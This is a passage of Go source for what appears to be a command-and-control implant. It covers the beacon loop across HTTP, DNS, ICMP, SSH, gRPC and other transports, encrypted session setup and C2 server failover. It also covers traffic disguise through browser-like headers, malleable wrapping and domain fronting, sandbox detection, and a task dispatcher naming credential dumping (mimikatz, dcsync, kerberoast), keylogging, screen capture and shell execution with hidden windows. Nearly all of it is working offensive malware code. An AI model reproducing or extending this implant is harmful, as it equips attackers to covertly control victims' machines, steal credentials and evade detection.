				if dnsConsecutiveFailures >= dnsFallbackThreshold {
					if Debug {
						fmt.Println("[!] DNS failure threshold reached, falling back to HTTP")
					}
					Protocol = "http"
					respBody = sendWithMode(sendBody)
				}
			} else {
				dnsConsecutiveFailures = 0
			}
		case Protocol == "icmp":
			respBody = sendICMPBeacon(sendBody)
		case Protocol == "udp":
			respBody = sendUDPBeacon(sendBody)
		case BeaconTransport == "wss":
			respBody = sendWSSBeacon(sendBody)
		case BeaconTransport == "grpc" || strings.HasPrefix(c2URLAtIndex(int(currentC2Idx.Load())), "grpc://") || strings.HasPrefix(c2URLAtIndex(int(currentC2Idx.Load())), "grpcs://"):
			respBody = sendGRPCBeacon(sendBody)
		case BeaconTransport == "ssh" || strings.HasPrefix(c2URLAtIndex(int(currentC2Idx.Load())), "ssh://"):
			respBody = sendSSHBeacon(sendBody)
		case BeaconTransport == "mtls" || strings.HasPrefix(c2URLAtIndex(int(currentC2Idx.Load())), "mtls://"):
			respBody = sendMTLSBeacon(sendBody)
		case BeaconTransport == "h2c" || strings.HasPrefix(c2URLAtIndex(int(currentC2Idx.Load())), "h2c://"):
			respBody = sendH2CBeacon(sendBody)
		default:
			respBody = sendWithMode(sendBody)
		}
	})
	if respBody != nil {
		noteTransportSuccess()
	} else {
		maybeRotateTransport()
	}
	if respBody == nil {
		pendingMu.Lock()
		pendingResults = append(resultsCopy, pendingResults...)
		pendingTaskAcks = append(acksCopy, pendingTaskAcks...)
		pendingMu.Unlock()
		// If the server never saw the frame (transport failure) our persisted
		// sequence may need to move forward. Advance by a small bounded step
		// (never the old +1000, which could itself exceed the replay-jump cap
		// and trip a permanent lockout). A genuine behind-the-server desync is
		// corrected by the server's signed last_seq resync, not by jumping.
		seqMu.Lock()
		beaconSeq += 8
		seqMu.Unlock()
		beaconConsecutiveFailures++
		if Debug {
			fmt.Printf("[!] Beacon returned nil, consecutive failures: %d\n", beaconConsecutiveFailures)
		}
		return
	}

	beaconConsecutiveFailures = 0

	// Parse response. The frame type determines the expected response shape:
	// auth frames get a plaintext envelope, encrypted frames get {"c": ...}.
	var resp BeaconResponse
	switch frameKind {
	case agentFrameRegister, agentFrameHandshake:
		var authResp struct {
			Seq           uint64 `json:"seq"`
			RegOK         bool   `json:"reg_ok"`
			ECDHPub       string `json:"ecdh_pub"`
			Mac           string `json:"mac"`
			Reregister    bool   `json:"reregister"`
			NetworkConfig string `json:"network_config"`
		}
		if err := json.Unmarshal(respBody, &authResp); err != nil {
			if Debug {
				log.Printf("[!] Failed to parse auth response: %v", err)
			}
			// Server rejected the frame (e.g. already registered): fall back to
			// the handshake path which works for any registered agent.
			if frameKind == agentFrameRegister {
				seqMu.Lock()
				registered = true
				seqMu.Unlock()
				persistBeaconState()
				inFastMode.Store(true)
			}
			return
		}
		// Authenticate the server's public key before trusting it.
		if !verifyResponseMAC(authResp.Seq, authResp.ECDHPub, authResp.Mac) {
			if Debug {
				log.Printf("[!] Auth response MAC mismatch, aborting")
			}
			return
		}
		if authResp.Reregister {
			// The server lost our registration (e.g. the implant row was deleted
			// server-side). Re-enroll with a fresh registration frame on the next
			// beacon — we still hold the identity key locally.
			seqMu.Lock()
			registered = false
			seqMu.Unlock()
			persistBeaconState()
			inFastMode.Store(true)
			return
		}
		// Apply any server-delivered network config (encrypted under our
		// per-implant secret). The response MAC already authenticated the frame,
		// so the config is trustworthy.
		applyServerNetworkConfig(authResp.NetworkConfig)
		// On registration the server derived its session from our identity key
		// (the register frame carries IdentityPub); on a handshake it used the
		// ephemeral key we presented. Derive our side with the matching key.
		var sessErr error
		if authResp.RegOK {
			sessErr = ecdhSess.establishRegisteredFromServerKey(authResp.ECDHPub)
		} else {
			sessErr = ecdhSess.establishFromServerKey(authResp.ECDHPub)
		}
		if sessErr != nil {
			if Debug {
				log.Printf("[!] ECDH handshake completion failed: %v", sessErr)
			}
			return
		}
		if authResp.RegOK {
			seqMu.Lock()
			registered = true
			seqMu.Unlock()
			persistBeaconState()
		}
		seqMu.Lock()
		rekeyRequested = false
		seqMu.Unlock()
		// Re-beacon immediately with the encrypted payload.
		inFastMode.Store(true)
		return
	case agentFrameEncrypted:
		var env struct {
			CipherB64 string `json:"c"`
		}
		if err := json.Unmarshal(respBody, &env); err != nil {
			return
		}
		if env.CipherB64 == "" {
			// No ciphertext: this may be a server resync signal (our sequence
			// fell behind). Apply it if the MAC verifies, otherwise ignore.
			tryResync(respBody)
			return
		}
		aad := []byte(agentUUID + "\x00" + strconv.FormatUint(frameSeq, 10))
		plaintext, err := ecdhSess.decryptAESGCMWithAAD(env.CipherB64, aad)
		if err != nil {
			// Server restarted or rekeyed: drop the session so the next beacon
			// performs a fresh authenticated handshake.
			if Debug {
				log.Printf("[!] ECDH decrypt failed: %v", err)
			}
			ecdhSess.invalidate()
			inFastMode.Store(true)
			return
		}
		if err := decodeBeacon(plaintext, &resp); err != nil {
			return
		}
		// Fast-forward if the server is ahead of us (guards against a desync
		// where our persisted sequence drifted behind the server's last_seq).
		if resp.LastSeq > 0 {
			seqMu.Lock()
			if resp.LastSeq >= beaconSeq {
				beaconSeq = resp.LastSeq + 1
			}
			seqMu.Unlock()
		}
		if resp.Rekey {
			seqMu.Lock()
			rekeyRequested = true
			seqMu.Unlock()
			ecdhSess.invalidate()
		}
	default:
		return
	}

	// Fleet kill-switch broadcast: verify and obey before processing anything
	// else (tasks, SOCKS, relayed frames).
	if resp.KillSwitch != "" || resp.KillSwitchMAC != "" {
		if verifyKillSwitch(resp.KillSwitch, resp.KillSwitchMAC) {
			engageKillSwitch()
		} else if Debug {
			log.Printf("[!] Ignoring invalid kill-switch broadcast (token mismatch)")
		}
	}

	// Process SOCKS relay frames from server (before tasks, so connect arrives first)
	if len(resp.SocksFrames) > 0 {
		socksProcessFrames(resp.SocksFrames)
	}

	// Distribute relayed tasks to P2P children
	if len(resp.Relayed) > 0 {
		p2pRelayMu.Lock()
		for _, rt := range resp.Relayed {
			p2pChildTasks[rt.AgentID] = append(p2pChildTasks[rt.AgentID], rt.Tasks...)
		}
		p2pRelayMu.Unlock()
	}

	// Relay opaque v2 reply envelopes to children (child sockets pick them up)
	p2pDeliverChildReplies(resp.RelayedReplies)

	// checkFastMode resets inFastMode, so we set SOCKS hints AFTER it
	checkFastMode(resp.Tasks)

	// SOCKS fast mode overrides (after checkFastMode's reset)
	if resp.SocksFastMode || len(resp.SocksFrames) > 0 || socksRelayFast {
		inFastMode.Store(true)
	}
	socksRelayMu.Lock()
	if len(socksRelayConns) > 0 {
		inFastMode.Store(true)
	}
	socksRelayMu.Unlock()

	for _, task := range resp.Tasks {
		enqueueTask(task)
	}
}

// c2URLsSnapshot returns a stable snapshot of the C2 URL list. The slice is
// never mutated after being published via c2URLsStore, so callers may iterate
// it without locking. Reading the old C2URLs slice directly (with a separate
// currentC2Idx) allowed an index-out-of-range panic when the list was replaced
// concurrently (e.g. on profile rotate) while another goroutine indexed it.
func c2URLsSnapshot() []string {
	if v := c2URLsAtomic.Load(); v != nil {
		return v.([]string)
	}
	return nil
}

// c2URLsStore publishes a new C2 URL list together with the index of the last
// working server, atomically, so readers can never observe a slice/idx mismatch.
func c2URLsStore(urls []string, idx int32) {
	if len(urls) == 0 {
		idx = 0
	} else if idx < 0 || idx >= int32(len(urls)) {
		idx = 0
	}
	c2URLsAtomic.Store(urls)
	currentC2Idx.Store(idx)
}

// c2URLAtIndex returns the C2 URL at i, clamped to the current list length so a
// stale index hint can never panic.
func c2URLAtIndex(i int) string {
	urls := c2URLsSnapshot()
	if len(urls) == 0 {
		return ""
	}
	if i < 0 || i >= len(urls) {
		i = 0
	}
	return urls[i]
}

func sendToC2(idx int, body []byte) []byte {
	urls := c2URLsSnapshot()
	if idx < 0 || idx >= len(urls) {
		return nil
	}
	url := urls[idx]

	beaconURI := beaconHTTPURI()

	method := getActiveBeaconMethodFromConfig()
	if method == "" {
		method = "POST"
	}
	// Apply request-side malleable transforms to the outbound body so the
	// server can strip them on inbound; the enclosed envelope is unchanged.
	body = padBeaconBody(body)
	body = wrapMalleableRequest(body)
	req, err := http.NewRequest(method, url+beaconURI, bytes.NewReader(body))
	if err != nil {
		return nil
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("User-Agent", getActiveUserAgentFromConfig())
	// Baseline browser-like headers so the beacon blends with ordinary HTTPS
	// traffic (cover-traffic fidelity). Malleable request headers and any
	// profile-supplied headers below override these defaults.
	req.Header.Set("Accept", "application/json, text/plain, */*")
	req.Header.Set("Accept-Language", "en-US,en;q=0.9")
	req.Header.Set("Accept-Encoding", "gzip, deflate, br")
	req.Header.Set("Connection", "keep-alive")
	for k, v := range getActiveHeaders() {
		if strings.EqualFold(k, "Content-Type") || strings.EqualFold(k, "User-Agent") {
			continue
		}
		req.Header.Set(k, v)
	}
	// Request-side malleable headers (e.g. Host/Cookie shaping). These are
	// benign to the server's JSON parsing; they simply ride along on the request.
	for k, v := range MalleableRequestHeaders {
		if strings.EqualFold(k, "Content-Type") || strings.EqualFold(k, "User-Agent") {
			continue
		}
		req.Header.Set(k, v)
	}

	if DomainFront != "" {
		req.Host = DomainFront
	}

	resp, err := client.Do(req)
	if err != nil {
		if Debug {
			fmt.Printf("[!] Beacon to %s failed: %v\n", url, err)
		}
		return nil
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		if Debug {
			fmt.Printf("[!] %s returned %d\n", url, resp.StatusCode)
		}
		return nil
	}

	data, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil
	}
	if Debug {
		fmt.Printf("[+] Beacon OK from %s, response %d bytes\n", url, len(data))
	}
	// The server's malleable profile may wrap the JSON reply with fixed
	// prepend/append bytes. Strip them here (HTTP transport only) so the
	// JSON envelope below parses; binary transports never wrap the frame.
	data = stripMalleableWrapping(data)
	// Reverse the server's profile output transforms (e.g. base64+xor) so the
	// encrypted envelope can be recovered; without this the preset C2 pipeline
	// is dead for the live agent. Decode order is the reverse of the server's
	// apply order, which agentApplyTransforms handles when encode=false.
	if len(malleableRespDecodeSteps) > 0 {
		if dec, err := agentApplyTransforms(data, malleableRespDecodeSteps, false); err == nil {
			data = dec
		} else if Debug {
			fmt.Printf("[!] malleable response decode failed: %v\n", err)
		}
	}
	return data
}

// stripMalleableWrapping removes the configured malleable prepend/append
// padding from an HTTP beacon response body. The server prepends/appends the
// exact strings configured in its malleable profile; stripping must be
// symmetrical or the JSON decoder rejects the reply.
func stripMalleableWrapping(data []byte) []byte {
	switch {
	case MalleablePrepend == "" && MalleableAppend == "":
		return data
	case MalleablePrepend == "":
		return bytes.TrimSuffix(data, []byte(MalleableAppend))
	case MalleableAppend == "":
		return bytes.TrimPrefix(data, []byte(MalleablePrepend))
	default:
		data = bytes.TrimPrefix(data, []byte(MalleablePrepend))
		return bytes.TrimSuffix(data, []byte(MalleableAppend))
	}
}

// wrapMalleableResponse applies the response-side malleable prepend/append so a
// raw (non-HTTP) link — a team-server TCP listener or a P2P parent→child reply
// — carries the same cover as the HTTP transport. It is the inverse of
// stripMalleableWrapping and a no-op when nothing is configured, keeping the
// framing backward-compatible for links that do not use a profile.
func wrapMalleableResponse(body []byte) []byte {
	switch {
	case MalleablePrepend == "" && MalleableAppend == "":
		return body
	case MalleablePrepend == "":
		return append(body, []byte(MalleableAppend)...)
	case MalleableAppend == "":
		return append([]byte(MalleablePrepend), body...)
	default:
		out := append([]byte(MalleablePrepend), body...)
		return append(out, []byte(MalleableAppend)...)
	}
}

// wrapMalleableRequest applies the request-side malleable transforms
// (prepend/append) to the agent's OUTGOING beacon body. The server strips this
// wrapping on inbound (stripMalleableRequest), so the JSON envelope it encloses
// is delivered unchanged. Binary/length-prefixed transports do not call this.
func wrapMalleableRequest(body []byte) []byte {
	switch {
	case MalleableRequestPrepend == "" && MalleableRequestAppend == "":
		return body
	case MalleableRequestPrepend == "":
		return append(body, []byte(MalleableRequestAppend)...)
	case MalleableRequestAppend == "":
		return append([]byte(MalleableRequestPrepend), body...)
	default:
		out := append([]byte(MalleableRequestPrepend), body...)
		return append(out, []byte(MalleableRequestAppend)...)
	}
}

func sendBeacon(body []byte) []byte {
	startIdx := int(currentC2Idx.Load())
	urls := c2URLsSnapshot()
	for i := 0; i < len(urls); i++ {
		idx := (startIdx + i) % len(urls)
		data := sendToC2(idx, body)
		if data != nil {
			currentC2Idx.Store(int32(idx))
			return data
		}
	}
	return nil
}

// sendTCPBeacon implements the TCP transport using length-prefixed JSON framing.
// C2URL should be host:port (or tcp://host:port) when Protocol=="tcp".
func sendTCPBeacon(body []byte) []byte {
	addr := strings.TrimPrefix(C2URL, "tcp://")
	addr = strings.TrimPrefix(addr, "tls://")

	var conn net.Conn
	var err error

	// Basic TLS support when SkipTLSVerify or using tls:// scheme
	useTLS := SkipTLSVerify || strings.HasPrefix(C2URL, "tls://")
	if useTLS {
		conn, err = dialUTLSTCP("tcp", addr)
	} else {
		conn, err = net.Dial("tcp", addr)
	}
	if err != nil {
		if Debug {
			fmt.Printf("[!] TCP beacon dial failed: %v\n", err)
		}
		return nil
	}
	defer conn.Close()

	// Write length (BE) + body
	if err := binary.Write(conn, binary.BigEndian, uint32(len(body))); err != nil {
		return nil
	}
	if _, err := conn.Write(body); err != nil {
		return nil
	}

	// Read response length
	var rlen uint32
	if err := binary.Read(conn, binary.BigEndian, &rlen); err != nil {
		return nil
	}
	if rlen == 0 || rlen > 16*1024*1024 {
		return nil
	}

	rbuf := make([]byte, rlen)
	if _, err := io.ReadFull(conn, rbuf); err != nil {
		return nil
	}
	// Mirror the HTTP transport: strip any malleable prepend/append cover the
	// server wrapped around the raw frame so the enclosed envelope parses.
	return stripMalleableWrapping(rbuf)
}

// tryResync applies a server resync signal: a plaintext, MAC-signed envelope
// carrying the server's current last_seq. If the MAC verifies and the server is
// ahead, the local counter is fast-forwarded so subsequent beacons are accepted
// instead of being permanently rejected as replays.
func tryResync(body []byte) {
	var r struct {
		Seq     uint64 `json:"seq"`
		ECDHPub string `json:"ecdh_pub"`
		Mac     string `json:"mac"`
		LastSeq uint64 `json:"last_seq"`
	}
	if err := json.Unmarshal(body, &r); err != nil {
		return
	}
	if r.ECDHPub == "" || r.Mac == "" {
		return
	}
	if !verifyResponseMAC(r.Seq, r.ECDHPub, r.Mac) {
		if Debug {
			log.Printf("[!] resync response MAC mismatch, ignoring")
		}
		return
	}
	seqMu.Lock()
	behind := r.LastSeq > beaconSeq
	if behind {
		beaconSeq = r.LastSeq + 1
	}
	seqMu.Unlock()
	if behind {
		persistBeaconState()
		inFastMode.Store(true)
		if Debug {
			log.Printf("[*] resynced sequence to %d (server last_seq=%d)", beaconSeq, r.LastSeq)
		}
	}
}

// verifyResponseMAC checks the server's authentication response MAC:
// HMAC(regKey, agentUUID || seq || server_pub). Guards against MITM public-key
// substitution. A missing/invalid registration key fails closed.
func verifyResponseMAC(seq uint64, serverPubB64, macB64 string) bool {
	if agentRegKey == nil || macB64 == "" || serverPubB64 == "" {
		return false
	}
	expected := computeFrameMAC(agentRegKey, agentUUID, strconv.FormatUint(seq, 10), serverPubB64)
	got, err := base64.StdEncoding.DecodeString(macB64)
	if err != nil {
		return false
	}
	return hmac.Equal(expected, got)
}

// v2Envelope is the top-level transport envelope (mirrors the server's
// beaconEnvelope field layout). SecretID is the v3 per-implant secret id,
// carried only on registration frames.
type v2Envelope struct {
	UUID        string `json:"uuid"`
	Seq         uint64 `json:"seq,omitempty"`
	Ts          int64  `json:"ts,omitempty"`
	ECDHPub     string `json:"ecdh_pub,omitempty"`
	CipherB64   string `json:"c,omitempty"`
	Mac         string `json:"mac,omitempty"`
	IdentityPub string `json:"id_pub,omitempty"`
	RegHMAC     string `json:"reg_hmac,omitempty"`
	SecretID    string `json:"secret_id,omitempty"`
}

// buildBeaconEnvelope wraps a plaintext beacon request in the v2 transport
// envelope: registration (first run), authenticated handshake (session
// missing/rekey), or AES-256-GCM ciphertext bound to (uuid, seq). Encryption
// is mandatory — there is no plaintext or legacy XOR fallback.
// Returns the bytes to transmit, the frame kind, the frame sequence and
// ok=false when the payload MUST NOT be sent.
func buildBeaconEnvelope(body []byte) (sendBody []byte, kind agentFrameKind, seq uint64, ok bool) {
	if ecdhSess == nil || identityPriv == nil {
		return nil, 0, 0, false
	}
	seq = nextBeaconSeq()
	ts := time.Now().Unix()
	env := v2Envelope{UUID: agentUUID, Seq: seq, Ts: ts}

	seqMu.Lock()
	reg := registered
	rekey := rekeyRequested
	seqMu.Unlock()

	switch {
	case !reg:
		// One-time registration binds the identity key.
		kind = agentFrameRegister
		idPub := identityPubB64()
		if idPub == "" || agentRegKey == nil {
			return nil, 0, 0, false
		}
		env.ECDHPub = idPub
		env.IdentityPub = idPub
		env.SecretID = RegSecretIDStr
		env.RegHMAC = base64.StdEncoding.EncodeToString(computeRegHMAC(agentRegKey, agentUUID, idPub, ts, seq))
	case ecdhSess.needsHandshake() || rekey:
		// Authenticated handshake with a fresh ephemeral key.
		kind = agentFrameHandshake
		env.ECDHPub = ecdhSess.publicKeyB64()
		if agentRegKey == nil {
			return nil, 0, 0, false
		}
		// v3: carry the per-implant secret id so the server can authenticate the
		// handshake against the secret store even if the implant row was deleted
		// server-side. This is what lets a v3 agent recover after row deletion.
		env.SecretID = RegSecretIDStr
		env.Mac = base64.StdEncoding.EncodeToString(computeFrameMAC(agentRegKey, agentUUID, env.ECDHPub, strconv.FormatInt(ts, 10), strconv.FormatUint(seq, 10)))
	default:
		kind = agentFrameEncrypted
		aad := []byte(agentUUID + "\x00" + strconv.FormatUint(seq, 10))
		cipherB64, err := ecdhSess.encryptAESGCMWithAAD(body, aad)
		if err != nil {
			return nil, 0, 0, false
		}
		env.CipherB64 = cipherB64
	}

	// Persist the sequence before sending so it can never go backwards.
	persistBeaconState()

	envelopeJSON, err := json.Marshal(env)
	if err != nil {
		return nil, 0, 0, false
	}
	return envelopeJSON, kind, seq, true
}

// ensureResultID assigns a per-result unique id when the producer did not
// supply one (results generated outside the task worker, e.g. screenshots).
// ids are RFC 9562 UUIDv7 so they are time-ordered and sortable while staying
// unpredictable.
func ensureResultID(res *TaskResult) {
	if res.ResultID != "" {
		return
	}
	res.ResultID = protocol.UUIDv7()
}

func sendTaskResult(res TaskResult) {
	// Results keep a unique id for server-side idempotency: a result that is
	// re-queued after a dropped frame is resent with a new envelope seq, so
	// the server must dedupe on (task_id, rid) rather than the frame seq.
	ensureResultID(&res)
	// Quick results only make sense over an established session. Without one,
	// re-queue so the next regular beacon carries the result — a registration
	// or handshake frame cannot piggyback results.
	seqMu.Lock()
	ready := registered && !rekeyRequested
	seqMu.Unlock()
	if ecdhSess == nil || ecdhSess.needsHandshake() || !ready {
		enqueueResult(res)
		inFastMode.Store(true)
		return
	}

	req := BeaconRequest{
		UUID:            agentUUID,
		ProtocolVersion: CurrentProtocolVersion,
		Results:         []TaskResult{res},
	}
	body, _ := json.Marshal(req)
	// Encrypt with the session key so quick results never leak plaintext over
	// any transport (including DNS). If encryption fails, re-queue the result
	// rather than transmitting it in clear.
	sendBody, kind, _, ok := buildBeaconEnvelope(body)
	if !ok || kind != agentFrameEncrypted {
		enqueueResult(res)
		inFastMode.Store(true)
		return
	}
	if Protocol == "tcp" {
		sendTCPBeacon(sendBody) // fire and forget
	} else if Protocol == "dns" {
		sendDNSBeacon(sendBody) // fire and forget
	} else if Protocol == "smb" || BeaconTransport == "smb" {
		sendSMBBeacon(sendBody)
	} else if BeaconTransport == "wss" {
		sendWSSBeacon(sendBody)
	} else if BeaconTransport == "ssh" || strings.HasPrefix(	c2URLAtIndex(int(currentC2Idx.Load())), "ssh://") {
		sendSSHBeacon(sendBody)
	} else if BeaconTransport == "mtls" || strings.HasPrefix(	c2URLAtIndex(int(currentC2Idx.Load())), "mtls://") {
		sendMTLSBeacon(sendBody)
	} else if BeaconTransport == "h2c" || strings.HasPrefix(	c2URLAtIndex(int(currentC2Idx.Load())), "h2c://") {
		sendH2CBeacon(sendBody)
	} else if BeaconTransport == "grpc" || strings.HasPrefix(	c2URLAtIndex(int(currentC2Idx.Load())), "grpc://") || strings.HasPrefix(	c2URLAtIndex(int(currentC2Idx.Load())), "grpcs://") {
		sendGRPCBeacon(sendBody)
	} else {
		sendBeacon(sendBody)
	}
}
func executeTask(task Task) TaskResult {
	res := TaskResult{
		TaskID: task.ID,
		Type:   task.Type,
	}

	// Decrypt payload if task is encrypted. The AAD binds each field to the
	// agent and task ID so ciphertext can't be replayed against other tasks.
	if task.Encrypted && ecdhSess != nil {
		aad := []byte(agentUUID + "\x00" + strconv.FormatUint(uint64(task.ID), 10))
		if task.Command != "" {
			dec, err := ecdhSess.decryptAESGCMWithAAD(task.Command, aad)
			if err == nil {
				task.Command = string(dec)
			} else {
				res.Error = "task payload decryption failed"
				return res
			}
		}
		if task.Data != "" {
			dec, err := ecdhSess.decryptAESGCMWithAAD(task.Data, aad)
			if err == nil {
				task.Data = string(dec)
			} else {
				res.Error = "task payload decryption failed"
				return res
			}
		}
		// Shell rides a secret for token_make (the plaintext password), so it
		// is encrypted by the server with the same AAD binding.
		if task.Shell != "" {
			dec, err := ecdhSess.decryptAESGCMWithAAD(task.Shell, aad)
			if err == nil {
				task.Shell = string(dec)
			} else {
				res.Error = "task payload decryption failed"
				return res
			}
		}
	}

	// In sandbox mode, only allow benign commands
	if inSandbox {
		safeCmds := map[string]bool{
			"ps": true, "ls": true, "shell": false, "beacon_now": true,
			"set_sleep": true, "exit": true, "terminate": true, "read": true,
		}
		if !safeCmds[task.Type] {
			res.Error = "sandbox mode: blocked by sandbox detection"
			return res
		}
	}

	// Check environment restrictions from ops profile
	if currentOpsProfile != nil {
		switch {
		case !currentOpsProfile.AllowShell && isShellTask(task.Type):
			res.Error = fmt.Sprintf("blocked by ops profile: %s not allowed in %s environment", task.Type, currentOpsProfile.ClassLabel)
			return res
		case !currentOpsProfile.AllowInjection && isInjectTask(task.Type):
			res.Error = fmt.Sprintf("blocked by ops profile: %s not allowed in %s environment", task.Type, currentOpsProfile.ClassLabel)
			return res
		case !currentOpsProfile.AllowCredDump && (task.Type == "mimikatz" || task.Type == "creds" || task.Type == "kerberoast" || task.Type == "lsa_bypass" || task.Type == "dcsync" || strings.HasPrefix(task.Type, "dpapi_")):
			res.Error = fmt.Sprintf("blocked by ops profile: %s not allowed in %s environment", task.Type, currentOpsProfile.ClassLabel)
			return res
		case !currentOpsProfile.AllowKeylogger && (task.Type == "keylogger_start" || task.Type == "keylogger_dump"):
			res.Error = fmt.Sprintf("blocked by ops profile: %s not allowed in %s environment", task.Type, currentOpsProfile.ClassLabel)
			return res
		case !currentOpsProfile.AllowScreenCapture && (task.Type == "screenshot" || task.Type == "screenshot_window" || task.Type == "screen_stream_start"):
			res.Error = fmt.Sprintf("blocked by ops profile: %s not allowed in %s environment", task.Type, currentOpsProfile.ClassLabel)
			return res
		}
	}

	if handler, ok := taskHandlers[task.Type]; ok {
		handler(task, &res)
	} else {
		res.Error = "unknown task type: " + task.Type
	}
	return res
}

func runShell(cmdStr, shell string) (string, error) {
	ctx := currentExecCtx()
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		if shell == "powershell.exe" || strings.Contains(strings.ToLower(shell), "powershell") {
			if !strings.Contains(cmdStr, "OutputEncoding") {
				cmdStr = "[Console]::OutputEncoding = [System.Text.Encoding]::UTF8; $OutputEncoding = [System.Text.Encoding]::UTF8; " + cmdStr
			}
			cmd = exec.CommandContext(ctx, "powershell.exe", "-NoProfile", "-NonInteractive", "-Command", cmdStr)
		} else {
			cmd = exec.CommandContext(ctx, "cmd.exe", "/C", "chcp 65001 >nul & "+cmdStr)
		}
		applyHideWindow(cmd)
	} else {
		// Linux / unix
		if shell == "" || shell == "bash" {
			cmd = exec.CommandContext(ctx, "bash", "-c", cmdStr)
		} else {
			cmd = exec.CommandContext(ctx, "sh", "-c", cmdStr)
		}
	}

	var out bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &out
	err := cmd.Run()
	if err != nil && ctx.Err() != nil && cmd.Process != nil {
		// Task aborted or timed out: the context kill only terminates the
		// direct child. Tear down the rest of the tree so an orphaned
		// `sleep 3600` does not linger. taskkill runs with a fresh context so
		// it executes even though the task's own context is already cancelled.
		if runtime.GOOS == "windows" {
			_ = exec.Command("taskkill", "/F", "/T", "/PID", strconv.Itoa(cmd.Process.Pid)).Run()
		} else {
			_ = cmd.Process.Kill()
		}
	}
	return decodeShellOutput(out.Bytes(), shell), err
}

// beaconBackoffSec returns the base backoff (seconds) for a given number of
// consecutive beacon failures. The exponent is clamped so the left shift can
// never overflow int64 (1<<63 at 64 failures) and the result stays positive
// and bounded by the 300s ceiling.
func beaconBackoffSec(failures int) int {
	if failures <= 0 {
		return 0
	}
	exp := failures - 1
	if exp > 9 {
		exp = 9
	}
	backoff := 1 << uint(exp)
	if backoff > 300 {
		backoff = 300
	}
	return backoff
}

// setDPIAware, captureScreenRGBA and keyloggerLoop are provided exclusively by
// platform-specific files (agent_windows.go / agent_linux.go) via build tags.
